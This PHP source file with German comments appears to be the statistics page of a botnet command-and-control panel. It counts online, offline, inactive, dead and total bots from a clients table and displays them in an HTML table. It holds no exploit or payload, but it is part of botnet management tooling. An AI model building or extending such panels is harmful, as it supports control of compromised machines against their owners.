<?php
	include("inc/config.php");
	include("inc/funcs.php");
	
	// Menge der Bots abfragen
	$cTime = time()-$time_on;
	$sql = 'SELECT COUNT(*) AS cMenge FROM `clients` WHERE `connect` > '.$cTime.';';
	$res = mysql_query($sql);
	$bots_online = mysql_result($res, 0);
	mysql_free_result($res);
	
	$cTime = time()-$time_tot;
	// Menge der toten Bots
	$sql = 'SELECT COUNT(*) AS cMenge FROM `clients` WHERE `connect` < '.$cTime.';';
	$res = mysql_query($sql);
	$bots_tot = mysql_result($res, 0);
	mysql_free_result($res);
	
	// Menge der inaktiven Bots
	$cTime = time()-$time_inaktiv;
	$sql = 'SELECT COUNT(*) AS cMenge FROM `clients` WHERE `connect` < '.$cTime.';';
	$res = mysql_query($sql);
	$bots_inaktiv = mysql_result($res, 0)-$bots_tot;
	mysql_free_result($res);
	
	// Menge der Bots Offline
	$sql = 'SELECT COUNT(*) AS cMenge FROM `clients` WHERE `connect` > '.$cTime.';';
	$res = mysql_query($sql);
	$bots_offline = mysql_result($res, 0)-$bots_online;
	mysql_free_result($res);

	// Alle Bots
	$sql = 'SELECT COUNT(*) AS cMenge FROM `clients` WHERE 1;';
	$res = mysql_query($sql);
	$bots_all = mysql_result($res, 0);
	mysql_free_result($res);
?>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="40%">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td><strong>Bots online: </strong></td>
    <td class="green"><?php echo showBotCount($bots_online, $bots_all); ?></td>
  </tr>
  <tr>
    <td><strong>Bots offline: </strong></td>
    <td class="red"><?php echo showBotCount($bots_offline, $bots_all); ?></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td><strong>Bots inaktiv: </strong></td>
    <td><?php echo showBotCount($bots_inaktiv, $bots_all); ?></td>
  </tr>
  <tr>
    <td><strong>Bots tot: </strong></td>
    <td><?php echo showBotCount($bots_tot, $bots_all); ?></td>
  </tr>
  <tr>
    <td><strong>Bots gesamt:</strong> </td>
    <td><?php echo showBotCount($bots_all, $bots_all); ?></td>
  </tr>
</table>